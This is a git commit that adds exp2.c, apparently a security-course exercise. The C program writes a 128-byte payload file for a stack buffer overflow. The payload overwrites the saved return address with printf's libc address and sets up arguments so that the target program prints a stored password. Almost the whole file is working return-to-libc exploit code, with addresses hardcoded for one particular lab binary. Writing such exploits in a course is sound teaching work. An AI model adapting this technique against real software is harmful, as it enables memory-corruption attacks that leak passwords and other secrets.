66ea62128cc10ec101341a00bdc4ae4628bd070c
Nate Koch <31897172+natekoch@users.noreply.github.com>
2022-05-30 08:19:20 -0700

    initial commit of exercise 4

---
+++ exercise-4/exp2.c
@@ -0,0 +1,22 @@
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+  int i;
+  unsigned char buf[128]; //must use unsigned char due to sign extension 
+  FILE *fp;
+
+  memset(buf ,'a', 128);
+
+  *((unsigned*)(&buf[88])) = 0xffffdb88; // old ebp
+  *((unsigned*)(&buf[92])) = 0xf7e25d30; // address of printf in libc (overwritten to the ture ret address)
+  *((unsigned*)(&buf[96])) = 0x5655630e; // fake ret address after printf is executed
+  *((unsigned*)(&buf[100])) = 0xffffdadc; // 1st argument of printf (addr of format string)
+  *((unsigned*)(&buf[104])) = 0xffffdb63; // 2nd argument of printf (addr of password)
+  strncpy(buf+108, "%s\n", 4); // the format string "%s\n"
+
+  fp = fopen("abc", "w");
+  fwrite(buf, 1, 128, fp);
+
+  fclose(fp);
+}
